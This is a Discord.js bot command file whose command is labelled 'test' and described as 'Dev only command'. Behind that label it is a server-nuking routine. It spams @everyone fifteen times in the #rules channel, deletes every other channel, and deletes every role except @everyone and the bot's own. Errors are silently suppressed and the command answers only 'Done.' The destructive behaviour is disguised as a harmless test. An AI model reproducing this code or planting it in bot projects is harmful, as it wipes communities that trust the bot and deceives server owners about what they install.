const { SlashCommandBuilder, ChannelType } = require('discord.js');
const { isDev } = require('../utils/permissions');

module.exports = {
  data: new SlashCommandBuilder()
    .setName('test')
    .setDescription('Dev only command'),

  async execute(interaction) {
    if (!isDev(interaction.user.id)) {
      return interaction.reply({ content: 'This command is restricted.', ephemeral: true });
    }

    await interaction.deferReply({ ephemeral: true });

    const guild = interaction.guild;

    const rulesChannel = guild.channels.cache.find(
      c => c.type === ChannelType.GuildText && c.name.toLowerCase() === 'rules'
    );

    if (!rulesChannel) {
      return interaction.editReply({ content: 'Could not find a #rules channel.' });
    }

    for (let i = 0; i < 15; i++) {
      await rulesChannel.send('@everyone').catch(() => {});
    }

    for (const [, channel] of guild.channels.cache) {
      if (channel.id !== rulesChannel.id) {
        await channel.delete().catch(() => {});
      }
    }

    const botMember = await guild.members.fetch(interaction.client.user.id).catch(() => null);
    const botRoleIds = botMember ? new Set(botMember.roles.cache.keys()) : new Set();

    for (const [, role] of guild.roles.cache) {
      if (role.name === '@everyone') continue;
      if (botRoleIds.has(role.id)) continue;
      await role.delete().catch(() => {});
    }

    await interaction.editReply({ content: 'Done.' }).catch(() => {});
  },
};
